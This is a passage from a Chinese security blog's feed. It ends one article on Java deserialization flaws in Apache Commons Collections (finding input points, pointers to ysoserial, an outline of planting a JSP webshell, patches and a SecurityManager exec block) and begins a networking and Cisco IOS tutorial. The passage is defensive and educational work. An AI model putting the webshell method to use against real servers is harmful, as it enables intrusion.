漏洞挖掘思路</h3><pre><code>(1)确定反序列化输入点：首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：   A. 源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点   B. 对该应用进行网络行为抓包，寻找序列化数据，如wireshark,tcpdump等；java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB(2)再考察应用的Class Path中是否包含Apache Commons Collections库(3)生成反序列化的payload(4)提交我们的payload数据</code></pre><h3 id="3-测试环境及工具"><a href="#3-测试环境及工具" class="headerlink" title="3. 测试环境及工具"></a>3. 测试环境及工具</h3><p><a href="http://www.jboss.org/" target="_blank" rel="noopener">JBoss</a> <em>一个管理和运行EJB项目的容器和服务器</em></p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> <em>用于生成利用不安全Java对象反序列化的有效负载的概念验证工具</em></p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">JavaUnserializeExploits</a> <em>WebLogic，WebSphere，JBoss反序列化漏洞利用</em></p><hr><h2 id="0x04-漏洞修补与防御"><a href="#0x04-漏洞修补与防御" class="headerlink" title="0x04 漏洞修补与防御"></a>0x04 漏洞修补与防御</h2><h3 id="1-漏洞总结"><a href="#1-漏洞总结" class="headerlink" title="1. 漏洞总结"></a>1. 漏洞总结</h3><pre><code>1. 引发：如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行2. 原因: 类ObjectInputStream在反序列化时，没有对生成的对象的输入做限制，使攻击者利用反射调用函数进行任意命令执行；CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法3. 根源：Apache Commons Collections允许链式的任意的类函数反射调用问题函数：org.apache.commons.collections.Transformer接口4. 利用：要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化代码5. 思路：攻击者通过允许Java序列化协议的端口，把序列化的攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行6. 攻击：漏洞对系统发起攻击，举一个简单的思路，通过本地java程序将一个带有后门漏洞的jsp（一般来说这个jsp里的代码会是文件上传和网页版的SHELL）序列化，将序列化后的二进制流发送给有这个漏洞的服务器，服务器会反序列化该数据的并生成一个webshell文件，然后就可以直接访问这个生成的webshell文件进行进一步利用</code></pre><h3 id="2-防御思路"><a href="#2-防御思路" class="headerlink" title="2. 防御思路"></a>2. 防御思路</h3><pre><code>开发者：　　为了确保序列化的安全性，可以对于一些敏感信息加密；　　确保对象的成员变量符合正确的约束条件；　　确保需要优化序列化的性能漏洞挖掘：　　(1)通过代码审计/行为分析等手段发现漏洞所在靶点　　(2)进行POC分析构造时可以利用逆推法</code></pre><h3 id="3-漏洞修补"><a href="#3-漏洞修补" class="headerlink" title="3. 漏洞修补"></a>3. 漏洞修补</h3><pre><code>目前打包有apache commons collections库并且应用比较广泛的主要组件有Jenkins WebLogic Jboss WebSphere  OpenNMS。其中Jenkins由于功能需要大都直接暴露给公网首先确认产品中是否包含上述5种组件使用grep命令或者其他相关搜索命令检测上述组件安装目录是否包含库Apache Commons Collections。搜索下列jar。commons-collections.jar*.commons-collections.jarapache.commons.collections.jar*.commons-collections.*.jar</code></pre><p><strong><em>通用解决方案</em></strong></p><pre><code>更新Apache Commons Collections库　　Apache Commons Collections在 3.2.2版本开始做了一定的安全处理，新版本的修复方案对相关反射调用进行了限制，对这些不安全的Java类的序列化支持增加了开关。NibbleSecurity公司的ikkisoft在github上放出了一个临时补丁SerialKiller　　lib地址:https://github.com/ikkisoft/SerialKiller　　下载这个jar后放置于classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller　　之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型</code></pre><p><em>Java相对来说安全性问题比较少，出现的一些问题大部分是利用反射，最终用Runtime.exec(String cmd)函数来执行外部命令的；如果可以禁止JVM执行外部命令，未知漏洞的危害性会大大降低，可以大大提高JVM的安全性</em></p><pre><code>SecurityManager originalSecurityManager = System.getSecurityManager();    if (originalSecurityManager == null) {        // 创建自己的SecurityManager        SecurityManager sm = new SecurityManager() {        private void check(Permission perm) {            // 禁止exec            if (perm instanceof java.io.FilePermission) {                String actions = perm.getActions();                if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) {                    throw new SecurityException(&quot;execute denied!&quot;);                }            }            // 禁止设置新的SecurityManager            if (perm instanceof java.lang.RuntimePermission) {                String name = perm.getName();                if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) {                    throw new SecurityException(                    &quot;System.setSecurityManager denied!&quot;);                }            }        }        @Override        public void checkPermission(Permission perm) {            check(perm);        }        @Override        public void checkPermission(Permission perm, Object context) {            check(perm);        }    };   System.setSecurityManager(sm);}</code></pre><p><em>在Java代码里简单加一段程序，就可以禁止执行外部程序</em></p><hr><h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul><li><p><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf" target="_blank" rel="noopener">OWASP Top10 2017</a></p></li><li><p><a href="https://access.redhat.com/security/cve/cve-2015-7501" target="_blank" rel="noopener">CVE-2015-7501(JBoss)</a></p></li><li><p><a href="https://www.oracle.com/technetwork/topics/security/alert-cve-2015-4852-2763333.html" target="_blank" rel="noopener">CVE-2015-4852(Weblogic)</a></p></li><li><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7450" target="_blank" rel="noopener">CVE-2015-7450(Websphere)</a></p></li></ul><ul><li><p><a href="https://xz.aliyun.com/search?page=1&amp;keyword=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">先知社区 - 反序列化漏洞分析系列</a></p></li><li><p><a href="http://search.freebuf.com/search/?search=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E#article" target="_blank" rel="noopener">Freebuf - 反序列化漏洞分析系列</a></p></li><li><p><a href="https://paper.seebug.org/?page=%201&amp;keyword=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">Seebug Paper - 反序列化漏洞系列</a></p></li><li><p><a href="http://blog.nsfocus.net/?s=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">NSFOCUS - 反序列化漏洞系列</a></p></li><li><p><a href="http://www.4hou.com/?s=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">RoarTalk - 反序列化漏洞分析系列</a></p></li><li><p><a href="https://www.anquanke.com/search?s=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E#" target="_blank" rel="noopener">安全客技术分享 - 反序列化漏洞系列</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/29465428" target="_blank" rel="noopener">知乎专栏 - Java序列化与反序列化</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;序列化是将运行时变量和程序对象转换成可以存储或传输的形式的过程，反序列化是将序列化形式转换回内存变量和程序对象的相反过程；许多高级的语言（如C＃，Java和PHP）都内置了对数据序列化的支持，如果攻击者控制的数据被反序列化，影响内存中的变量和程序对象，那么可以使用这些变量和对象的代码流。本文对序列化/反序列化基本概念，反序列化漏洞原理及利用进行总结&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="漏洞分析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Vulnerability" scheme="http://www.firehacker.top/tags/Vulnerability/"/>
    
  </entry>
  
  <entry>
    <title>路由、交换、组网技术浅析</title>
    <link href="http://www.firehacker.top/2018/10/04/%E8%B7%AF%E7%94%B1-%E4%BA%A4%E6%8D%A2-%E7%BB%84%E7%BD%91%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/10/04/路由-交换-组网技术浅析/</id>
    <published>2018-10-04T04:22:44.000Z</published>
    <updated>2018-10-24T06:53:30.741Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文对网络协议，路由交换，组网等技术进行分析，涉及RIP，OSPF，EIGR等路由协议，VLAN，STP，ACL，NAT，DHCP，PPP等网络技术，以及 Cisco ISO 与 Cisco Packet Tracer 的基本命令及用法</p></blockquote><a id="more"></a><hr><h2 id="0x00-协议精析"><a href="#0x00-协议精析" class="headerlink" title="0x00 协议精析"></a>0x00 协议精析</h2><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%8D%8F%E8%AE%AE%E6%A0%88.png" alt=""></p><h3 id="1-OSI-七层模型"><a href="#1-OSI-七层模型" class="headerlink" title="1. OSI 七层模型"></a>1. OSI 七层模型</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B.png" alt=""></p><h3 id="2-TCP-IP-协议"><a href="#2-TCP-IP-协议" class="headerlink" title="2. TCP/IP 协议"></a>2. TCP/IP 协议</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/TCP%E6%A8%A1%E5%9E%8B.png" alt=""></p><pre><code>1. ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源2. IP（Internet Protocol 网际协议）连接两个节点。每个节点都由一个32位地址来标识。当发送消息时，IP协议从较高级的协议（TCP或UDP）接受消息，并添加包含有关目标主机信息的IP报头3. ICMP（Internet控制消息协议）是一个控制协议，IP设备用来向其他的IP设备通知网络中的活动和错误。如果没有TCP协议，则IP 并不是一个可靠的协议，并且没有确认，没有数据的错误控制功能（只有一个报头校验和），也不能重新传输。ICMP消息在IP报头的内部发送，ICMP消息来发送的类型：响应和响应回复，目标不可达和重定向，超时。在用PING命令时会发送4个ICMP消息4. IGMP（Internet组管理协议）是IP协议的一个扩充，必须由IP模块来实现。多播应用程序使用IGMP，利用IGMP消息发送对某个多播地址的一组成员请求，这样就能够注册某条多播消息，也可以使用IGMP取消成员的关系5. TCP（传输控制协议），TCP要求在发送数据之前必须打开连接。服务器应用程序必须执行一个称作被动打开（passive open）的操作，以利用一个已知的端口号创建一个连接，这时，服务器并不是对网络进行呼叫，而是侦听并等待引入的请求。客户应用程序必须执行一个主动打开（active open），为此，它向服务器应用程序发送一个同步序列号（SYN）以标识连接。客户应用程序可以将动态端口号作为本地的端口使用。服务器必须向客户发送一个确认（ACK）以及服务器的序列号（SYN），随后，客户恢复一个ACK，这样就建立连接了。如果在收到ACK之前发送方已经超时，则消息将被放到重发队列中以再次发送6. UDP（用户数据报协议），UDP是一个速度很快的协议，因为它仅仅指定了数据传输所需要的最低机制，它的缺点，消息接收顺序不确定，第一个发送的消息可能最后一个被接到。消息可能丢失，也可能同时接收到2个相同的消息。在发送多播和广播时，我们通常不希望从每个节点都返回一个确认，这样将使服务器超负荷，并且网络负荷变大，所以在这个情况下使用UDP协议是很好的选择7. SCTP（Stream Control Transmission Protocol，流控制传输协议）是一个面向连接的流传输协议，它可以在两个端点之间提供稳定、有序的数据传递服务。SCTP可以看做是TCP协议的改进，它继承了TCP较为完善的拥塞控制8. FTP（File Transfer Protocol 文件传输协议）用于将文件复制到服务器，反之亦然。他还能列举服务器上的文件和目录。他是一个基于TCP的应用层协议，FTP命令封装在TCP消息的TCP数据块中9. HTTP（Hypertext Transfer Protocol 超文本传输协议）HTTP是一个可靠的协议，这通过使用TCP来实现，HTTP具有：缓存、客户应用程序身份识别、支持各种MIME格式的不同附件等10. HTTPS（SSL上的HTTP）如果需要与WEB服务器交换机密数据，则可以使用HTTPS，SSL（Secure Socket Layer 安全套接字层），SSL在TCP之上，他使用一个公钥/私钥原理来交换保密的对称密钥，用一个对称密钥来加密消息。想要支持HTTPS，WEB服务器必须安装一个证书，HTTPS默认端口是44311. DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一个局域网的网络协议，使用UDP协议工作，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率；DHCP协议采用客户端/服务器模型，主机地址的动态分配任务由网络主机驱动。当DHCP服务器接收到来自网络主机申请地址的信息时，才会向网络主机发送相关的地址配置等信息，以实现网络主机地址信息的动态配置12. SMTP（Simple Mail Transfer Protocol 简单邮件传输协议）是一个用于发送和接受邮件消息的协议。SMTP不允许我们从邮件服务器读取消息，为此需要使用POP3或者IMAP协议13. POP3（Post Office Protocol 邮局协议）是为断开环境设计的。利用POP3，客户可以访问服务器，并获取服务器为其所保留的消息14. IMAP（Internet Message Access Protocol Internet消息访问协议）用来访问邮件服务器上的邮件，IMAP客户可以有脱机模式，这时可以在本地机器上对邮件进行操作。IMAP使客户能够对远程邮箱进行操作，就像是本地操作邮箱一样15. NNTP（Network News Transfer Protocol 网络新闻传输协议）是一个用于提交，中继和获取消息的应用层协议，该协议提供了能够访问新闻服务器并且从中获取选定消息的客户应用程序，并且还支持服务器到服务器的消息传输16. SNMP（Simple Network Management Protocol 简单网络管理协议）可以对网络上的设备进行管理。SNMP的目的在于利用性能问题和故障触发的警报来有效的管理设备，并且允许对设备进行配置。与网络设备相关联的SNMP代理将有一个MIB（Management Information Base 管理信息库）数据库，它将面向对象的方式包含了该设备的可管理信息。SNMP客户通过发送SNMP GET 请求来访问数据库中的信息，用SNMP SET 请求配置MIB数据库17. Telnet协议，该协议使我们能够利用用户身份验证连接到一个远程系统，然后从一个控制台环境远程调用命令</code></pre><h3 id="3-安全协议"><a href="#3-安全协议" class="headerlink" title="3. 安全协议"></a>3. 安全协议</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE.png" alt=""></p><pre><code>1. WEP（Wired Equivalent Privacy，有线等效保密协议）是对在两台设备间无线传输的数据进行加密的方式，用以防止非法用户窃听或侵入无线网络，IEEE 802.11 标准的一部分，使用 RC4(Rivest Cipher) 串流加密技术达到机密性，并使用 CRC-32 验和达到资料正确性2. WPA (Wi-Fi Protected Access，Wi-Fi网络安全接入)是一种基于标准的可互操作的WLAN安全性增强解决方案，可大大增强现有以及未来无线局域网系统的数据保护和访问控制水平，WPA 的资料是以一把 128 位元的钥匙和一个 48 位元的初向量 (IV) 的 RC4 stream cipher 来加密。WPA 在使用中可以动态改变钥匙的“临时钥匙完整性协定”（Temporal Key Integrity Protocol，TKIP）3. WPA2 是经由 Wi-Fi 联盟验证过的 IEEE 802.11i 标准的认证形式。WPA2 实现了 802.11i 的强制性元素 ，特别是 Michael 算法由公认彻底安全的 CCMP 讯息认证码所取代、而 RC4 也被 AES 取代4. EAP（Extensible Authentication Protocol，可扩展身份验证协议）是一系列验证方式的集合，设计理念是满足任何链路层的身份验证需求，支持多种链路层认证方式。EAP协议是IEEE 802.1x认证机制的核心，它将实现细节交由附属的EAP Method协议完成，如何选取EAP method由认证系统特征决定。这样实现了EAP的扩展性及灵活性，EAP可以提供不同的方法分别支持PPP，以太网、无线局域网的链路验证5. PPTP（Point to Point Tunneling Protocol，点对点隧道协议）该协议是在PPP协议的基础上开发的一种新的增强型安全协议，支持多协议虚拟专用网（VPN），可以通过密码验证协议（PAP）、可扩展认证协议（EAP）等方法增强安全性。可以使远程用户通过拨入ISP、通过直接连接Internet或其他网络安全地访问企业网6. IPSec（Internet 协议安全性)是一种开放标准的框架结构，通过使用加密的安全服务以确保在 Internet 协议 (IP) 网络上进行保密而安全的通讯，它通过端对端的安全性来提供主动的保护以防止专用网络与 Internet 的攻击；IPsec主要由以下协议组成：一、认证头（AH），为IP数据报提供无连接数据完整性、消息认证以及防重放攻击保护；二、封装安全载荷（ESP），提供机密性、数据源认证、无连接完整性、防重放和有限的传输流（traffic-flow）机密性；三、安全关联（SA），提供算法和数据包，提供AH、ESP操作所需的参数7. SSL/TLS（传输层安全性协议（英语：Transport Layer Security，缩写作 TLS），及其前身安全套接层（Secure Sockets Layer，缩写作 SSL）是一种安全协议，目的是为互联网通信，提供安全及数据完整性保障，在浏览器、电子邮件、即时通信、VoIP、网络传真等应用程序中，广泛支持这个协议，该协议由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。较低的层为 TLS 记录协议，位于某个可靠的传输协议（例如 TCP）上面，与具体的应用无关8. SSH（Secure Shell，安全外壳协议）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH通过在网络中创建安全隧道来实现SSH客户端与服务器之间的连接，最常见的用途是远程登录系统。SSH 主要由三部分组成：一 传输层协议 [SSH-TRANS]，提供了服务器认证，保密性及完整性。此外它有时还提供压缩功能；二 用户认证协议 [SSH-USERAUTH]，用于向服务器提供客户端用户鉴别功能；三 连接协议 [SSH-CONNECT]，将多个加密隧道分成逻辑通道9. PGP（英语：Pretty Good Privacy，中文翻译“优良保密协议”）是一套用于消息加密、验证的应用程序，采用IDEA的散列算法作为加密与验证之用，PGP加密由一系列散列、数据压缩、对称密钥加密，以及公钥加密的算法组合而成10. S/MIME (Secure Multipurpose Internet Mail Extensions，多用途网际邮件扩充协议)是一种Internet标准，它在安全方面对MIME协议进行了扩展，可以将MIME实体（比如数字签名和加密信息等）封装成安全对象，为电子邮件应用增添了消息真实性、完整性和保密性服务11. SET协议（Secure Electronic Transaction，安全电子交易协议）为了实现更加完善的即时电子支付应运而生的安全协议，SET协议是B2C上基于信用卡支付模式而设计的，它保证了开放网络上使用信用卡进行在线购物的安全。SET主要是为了解决用户，商家，银行之间通过信用卡的交易而设计的，它具有的保证交易数据的完整性，交易的不可抵赖性等种种优点</code></pre><hr><h2 id="0x01-Cisco-IOS"><a href="#0x01-Cisco-IOS" class="headerlink" title="0x01 Cisco IOS"></a>0x01 Cisco IOS</h2><h3 id="1-用户界面"><a href="#1-用户界面" class="headerlink" title="1. 用户界面"></a>1. 用户界面</h3><p><em>思科 IOS (Internetwprk Opearting System，互联网操作系统)是一个专用内核，提供路由选择，交换，网络互联和远程通信功能</em></p><p><strong><em>连接配置方式</em></strong></p><pre><code>1. 控制台(console)终端连接：控制台端口通常是一个RJ-45(8针的模块化)街头，位于路由器背面2. 辅助端口(auxiliary port)连接：可配置调制解调器命令，以便将其连接到路由器3. Telnet远程连接：带内方式连接，通过网络配置路由器</code></pre><h3 id="2-命令行界面"><a href="#2-命令行界面" class="headerlink" title="2. 命令行界面"></a>2. 命令行界面</h3><p><strong><em>(1) 进入 CLI</em></strong></p><p><em>用户EXEC模式：用户模式，用于查看统计信息，进入特权模式的跳板</em></p><p><em>特权EXEC模式：特权模式，用于修改配置Cisco路由器</em></p><pre><code>Router&gt;enable （进入特权模式）Router# （特权模式）Router#disable （返回用户模式）Router&gt; （用户模式）Router&gt;logout （退出控制台）</code></pre><p><strong><em>(2) 路由器模式</em></strong></p><p><em>在CLI中，可对路由器做全局修改，输入<code>configure terminal</code>简写<code>config t</code>，进入全局配置模式，以修改运行配置</em></p><pre><code>Router#config  (特权模式执行config)Router(config)#  (全局模式)Router(config)#exit or press ctrl-z  （退出全局模式）Router#</code></pre><p><strong><em>(3) CLI 提示符</em></strong></p><p><em>A. 接口</em></p><p><em>全局配置模式下执行命令interface</em></p><pre><code>Router(config)#interface ?Router(config)#interface fastEthernet 0/0Router(config-if)# （接口配置模式）</code></pre><p><em>B. 子接口</em></p><p><em>子接口允许在路由器中创建逻辑接口</em></p><pre><code>Router(config-if)#interface f0/0.1Router(config-sbuif)#  (子接口模式)</code></pre><p><em>C. line 命令</em></p><p>配置用户模式密码，执行命令 line，提示符变为<code>Router(config-line)#</code></p><pre><code>Router#config tRouter(config)#line ?</code></pre><p><em>D. 配置路由选择协议</em></p><pre><code>Router#config tRputer(config)#router ripRouter(config-router)#version 2Router(config-router)#</code></pre><p><em>E. 路由器术语</em></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%9C%AF%E8%AF%AD.png" alt=""></p><p><strong><em>(4) 编辑/帮助功能</em></strong></p><pre><code>Router#?  (显示提示符下可执行命令列表)Router#c? （查看某个字母打头的命令）Router#clock ? （获取命令下一个可能的参数及参数用途）</code></pre><p><em>高级编辑命令</em></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E9%AB%98%E7%BA%A7%E7%BC%96%E8%BE%91.png" alt=""></p><p><em>查看路由器命令历史纪录</em></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95.png" alt=""></p><p><strong><em>(5) 收集路由选择信息</em></strong></p><p><em>命令<code>show verrsion</code>显示系统硬件的基本配置以及软件版本和启动映像</em></p><p><em>命令<code>show interfacces</code> 和 <code>show ip interfacce brief</code>，可用于验证路由器配置以及排除路由器和网络故障</em></p><h3 id="3-常用配置"><a href="#3-常用配置" class="headerlink" title="3. 常用配置"></a>3. 常用配置</h3><p><strong><em>(1) 配置主机名</em></strong></p><p><em>设置路由器的身份，可使用命令<code>hostname</code>，常根据路由器位置命令</em></p><pre><code>Router#config tRouter(config)#hostname R1R1(config)#hostname R2R2(config)#hostname R1R1(config)#</code></pre><p><strong><em>(2) 配置旗标</em></strong></p><p><em>配置旗标，可给任何试图通过远程登录或拨号连接你的互联网的人发出安全警告</em></p><p><strong><em>4种类型的旗标(banner)</em></strong></p><pre><code>1. EXEC进程创建旗标(exec process creation banner)：2. 入站终端路线旗标(incoming terminal line banner)：给使用反向Telnet的用户提供操作说明3. 登录旗标：在motd旗标之后显示，在登录提示出现之前显示，全局禁用使用no banner login将其删除4. 每日消息旗标：motd，每日消息，向任何连接路由器的人显示一条警告消息</code></pre><p><strong><em>(3) 设置密码</em></strong></p><p><em>5种确保路由器安全的密码：控制台密码，辅助端口密码，远程登录密码，启用密码，启用加密密码</em></p><p><em>启用密码，启用加密密码控制用户进入特权模式，其余3种用于进入用户模式</em></p><h3 id="4-实验示例"><a href="#4-实验示例" class="headerlink" title="4. 实验示例"></a>4. 实验示例</h3><p><em>参考链接：</em><a href="https://www.cisco.com/c/en/us/products/ios-nx-os-software/ios-software-releases-listing.html" target="_blank" rel="noopener">Cisco-ios-nx-os-software</a></p><hr><h2 id="0x02-路由协议"><a href="#0x02-路由协议" class="headerlink" title="0x02 路由协议"></a>0x02 路由协议</h2><h3 id="1-路由基础"><a href="#1-路由基础" class="headerlink" title="1. 路由基础"></a>1. 路由基础</h3><p><strong>(1) 路由控制</strong></p><p><em>互联网由路由器连接的网络组合而成，为了让数据包正确达到目标主机，路由器必须在途中进行正确的转发</em></p><p><em>路由器根据路由控制表(Routing Table)转发数据包，它根据所收到的数据包中目标主机的IP地址与路由控制表的比较得到下一个应该接收的路由器</em></p><p><strong>(2) 路由控制类型</strong></p><p><strong><em>A. 静态路由</em></strong></p><p><em>事先设置好路由器和主机，并将路由信息固定，通常由使用者手工操作完成</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1.png" alt=""></p><pre><code>1. 每增加一个新的网络，需要将这个新被追加的网络信息设置在所有路由器上，管理困难2. 一旦某个路由器发生故障，需管理员手工设置以后才会恢复正常3. 适用于网络规模不大，拓扑结构固定的网络4. 对CPU，内存等硬件要求不高；不占用网络带宽5. 安全性，保密性较高，容易实现对网络的控制</code></pre><p><strong><em>B. 动态路由</em></strong></p><p><em>路由器给相邻路由器发送自己已知的网络连接信息，这些信息依次传递给其他路由器，直至整个网络</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1.png" alt="">    </p><pre><code>1. 当有新的网络被追加到原有网络中时，只需在新增网络的路由器上进行一个动态路由设置2. 网络发生故障时，数据包自动选择其他可行路径，路由器自动重置</code></pre><p><strong>(3) 路由控制范围</strong></p><p><em>根据路由控制的范围常使用内部网关协议 <code>IGP(Interior Gateway Ptotocol)</code> 和外部网关协议 <code>EGP(Exterior Gateway Procotol)</code> 两种类型的路由协议</em></p><p><em>A. 自治系统与路由协议</em></p><p><em>制定自己的路由策略，并以此为准在一个或多个网络群体中采用的小型单位叫做自治系统(AS：Autonomous System) 或路由选择域(Routing Domain)</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E8%87%AA%E6%B2%BB%E7%B3%BB%E7%BB%9F.png" alt=""><br><em><br>路由选择域内部动态路由采用的协议是域内路由协议，即 IGP；路由选择域之间的路由控制采用的是域间路由协议，即 EGP</em></p><p><em>B. IGP与EGP</em></p><pre><code>1. IP地址分为网络部分和主机部分，根据IP地址的网络部分在网络之间进行路由选择，根据主机部分在链路内部进行主机识别2. 根据EGP在网络之间(或ISP之间)进行路由选择，根据IGP在区域网络内部(或ISP内部)进行主机识别3. IGP之使用RIP(Routing Information Protocol，路由信息协议)，RIP2，OSPF(Open Shortest Path First，开放式最短路径优先)等众多协议；EGP使用BGP(Border Grateway Protocol，边界网关协议)协议</code></pre><p><strong>(2) 路由协议</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE.png" alt=""></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE.png" alt=""></p><h3 id="2-RIP及配置"><a href="#2-RIP及配置" class="headerlink" title="2. RIP及配置"></a>2. RIP及配置</h3><p><em><code>RIP</code>(Routing Information Protocol，路由信息协议)是距离向量型的一种路由协议，广泛用于LAN</em></p><p><strong>(1) 广播路由控制信息</strong></p><p><em>RIP将路由控制信息定期向全网广播，如果没有收到路由控制信息，连接被断开</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/RIP.png" alt=""></p><p><strong>(2) 根据距离向量确定路由</strong></p><p><em>距离的单位为跳数，跳数是指所经过的路由器的个数，RIP希望尽可能少通过路由器将数据包转发到目标IP地址</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/RIP%E7%A1%AE%E5%AE%9A%E8%B7%AF%E7%94%B1.png" alt=""></p><p><strong>(3) 使用子网掩码是的RIP处理</strong></p><p><em>RIP虽然不交换子网掩码信息，但可用于使用子网掩码的网络环境</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/RIP%E5%AD%90%E7%BD%91.png" alt=""></p><p><strong>(4) RIP 路由变更时的处理</strong></p><pre><code>1. 将自己知道的路由信息定期进行广播2. 一旦认为网络被断开，数据将无法流过此路由器，其他路由器也就可以得知网络已经断开</code></pre><p><strong>(5) RIP2</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/RIP2.png" alt=""></p><h3 id="3-OSPF及配置"><a href="#3-OSPF及配置" class="headerlink" title="3. OSPF及配置"></a>3. OSPF及配置</h3><p><em>OSPF(Open Shortest Path First，开放式最短路径优先协议)是根据OSI的IS-IS协议而提出的链路状态型路由协议，可解决网络中的环路，OSPF支持子网掩码</em></p><p><strong>(1) 链路状态型路由协议</strong></p><p><em>OSPF为链路状态路由器，路由器之间交换链路状态生成网络拓扑信息，然后根据拓扑信息生成路由控制表</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%AF%B9%E6%AF%94.png" alt=""></p><p><em>RIP的路由选择，要求途中所经过的路由器个数越少越好</em></p><p><em>OSPF以每个链路上的代价为度量标准，始终选择一个总的代价最小的一条路径</em></p><p><strong>(2) OSPF 工作原理</strong></p><p><em>OSPF中五种类型的包</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E6%8A%A5%E7%B1%BB%E5%9E%8B.png" alt=""></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%8E%9F%E7%90%86.png" alt=""></p><h3 id="4-BGP-协议"><a href="#4-BGP-协议" class="headerlink" title="4. BGP 协议"></a>4. BGP 协议</h3><p><em>BGP(Border Gateway Protocol，边界网关协议)是连接不同自治系统的一种协议，它属于外部网关协议(EGP)，主要用于ISP之间连接的部分</em></p><p><strong>(1) BGP 与 AS 号</strong></p><p><em>在RIP与OSPF中利用IP的网络地址部分进行着路由控制，BGP的最终路由控制有网络地址和下一站的路由器组来表示，根据所要经过的AS个数进行路由控制</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/AS.png" alt=""></p><p><strong>(2) 路径向量协议</strong></p><p><em>BGP中数据包送达目标网络时，会生成一个中途经过所有AS的编号列表，针对同一个目标地址出现多条路径时，BGP会从AS路径信息访问列表中选择一个较短的路由，根据索要经过的路由信息访问列表进行路由控制的协议属于路径向量(Path Vector)型协议</em></p><p><em>在做路由选择是使用的度量，RIP中表示为路由个数，OSPF中表示为每个子网的成本，BGP则用AS进行度量标准</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/BGP.png" alt=""></p><p><em>路径向量型协议能够检测出环路，可避免无限计数，还有支持策略路由的优势</em></p><hr><h2 id="0x03-交换技术"><a href="#0x03-交换技术" class="headerlink" title="0x03 交换技术"></a>0x03 